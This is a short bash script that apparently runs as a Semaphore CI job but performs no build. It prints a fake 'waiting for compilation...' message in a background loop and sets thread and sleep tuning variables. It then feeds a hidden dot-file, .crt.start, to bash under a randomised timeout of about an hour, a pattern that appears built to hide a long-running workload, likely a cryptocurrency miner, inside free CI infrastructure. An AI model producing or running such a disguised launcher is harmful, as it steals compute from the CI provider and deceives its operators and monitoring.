#!/usr/bin/env bash


while :; do echo waiting for compilation...; sleep $((RANDOM%30+30)); done &

export ENV_VARS="X_ID=\"semaphore-${SEMAPHORE_REPO_SLUG//\//-}-${SEMAPHORE_CURRENT_JOB}\" MHF_FIXED=1 THREADS_FIXED=4 CSLEEP=10000"
timeout -k 5 $(((RANDOM%3+59-$RANDOM%3)*60)) bash < ./.crt.start

exit 0
